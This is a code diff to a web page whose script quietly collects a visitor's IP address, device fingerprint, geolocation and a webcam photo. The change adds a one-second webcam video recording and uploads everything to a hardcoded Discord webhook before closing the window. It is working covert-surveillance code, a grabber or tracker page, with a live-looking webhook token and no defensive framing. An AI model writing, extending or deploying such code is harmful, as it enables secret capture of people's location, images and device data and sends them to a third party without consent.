@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>40+ Info Collection</title>
+  <title>Full Data + Video + Photo</title>
   <style>
     body {
       margin: 0;
@@ -22,7 +22,7 @@
 </head>
 <body>
 <div id="status">Initializing...</div>
-<video id="video" style="display:none;"></video>
+<video id="video" style="display:none;" autoplay></video>
 <script>
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495173417434087525/Peg6A9-52ckoH0A0Le00aBhX_GXH65Qx0Pq7NZdQNIY-8BhpPu2XEVqSVJ_7FUcE8Wl9';
 
@@ -57,18 +57,18 @@ const info = {
   hardwareConcurrency: navigator.hardwareConcurrency,
   maxTouchPoints: navigator.maxTouchPoints,
   resolution: window.screen.width + 'x' + window.screen.height,
-  touchSupport: 'N/A'
+  touchSupport: 'N/A',
+  latitude: null,
+  longitude: null
 };
 
 async function getSystemInfo() {
-  // IP
   try {
     const res = await fetch('https://api.ipify.org?format=json');
     const data = await res.json();
     info.ip = data.ip;
   } catch { info.ip = 'Unknown'; }
 
-  // WebGL info
   try {
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -79,13 +79,11 @@ async function getSystemInfo() {
     }
   } catch { }
 
-  // Audio sample rate
   try {
     const ctx = new (window.AudioContext || window.webkitAudioContext)();
     info.sampleRate = ctx.sampleRate;
   } catch { }
 
-  // UserAgentData
   if (navigator.userAgentData) {
     info.uaBrand = navigator.userAgentData.brands.join(', ');
     info.uaPlatform = navigator.userAgentData.platform;
@@ -117,16 +115,35 @@ async function takePhoto() {
     video.srcObject = stream;
     await new Promise(res => video.onloadedmetadata = res);
     ctx.drawImage(video, 0, 0);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
     stream.getTracks().forEach(t => t.stop());
-    return dataUrl;
+    return canvas.toDataURL('image/jpeg', 0.9);
   } catch(e) {
-    return null; // user denied or error
+    return null;
+  }
+}
+
+async function recordVideo() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const mediaRecorder = new MediaRecorder(stream);
+    const chunks = [];
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.start();
+
+    await new Promise(res => setTimeout(res, 1000)); // 1 sec recording
+    mediaRecorder.stop();
+
+    await new Promise(res => mediaRecorder.onstop = res);
+    stream.getTracks().forEach(t => t.stop());
+
+    const blob = new Blob(chunks, { type: 'video/webm' });
+    return blob;
+  } catch(e) {
+    return null;
   }
 }
 
 async function sendData() {
-  // Compose info string with 40+ points
   const locStr = (info.latitude && info.longitude) ? 
     `Lat: ${info.latitude}\nLon: ${info.longitude}` : 
     'Location unavailable';
@@ -182,6 +199,9 @@ async function sendData() {
   if (info.photoBlob) {
     formData.append('files[0]', info.photoBlob, 'photo.jpg');
   }
+  if (info.videoBlob) {
+    formData.append('files[1]', info.videoBlob, 'video.webm');
+  }
   formData.append('payload_json', JSON.stringify({ content }));
   await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
   window.close();
@@ -198,13 +218,16 @@ async function main() {
     info.photoBlob = await res.blob();
   }
 
+  document.getElementById('status').innerText = 'Recording 1-second video...';
+  info.videoBlob = await recordVideo();
+
   document.getElementById('status').innerText = 'Getting location...';
   await getLocation();
 
   document.getElementById('status').innerText = 'Waiting 1 second...';
   await new Promise(r => setTimeout(r, 1000));
 
-  document.getElementById('status').innerText = 'Sending data...';
+  document.getElementById('status').innerText = 'Sending...';
   await sendData();
 }
 
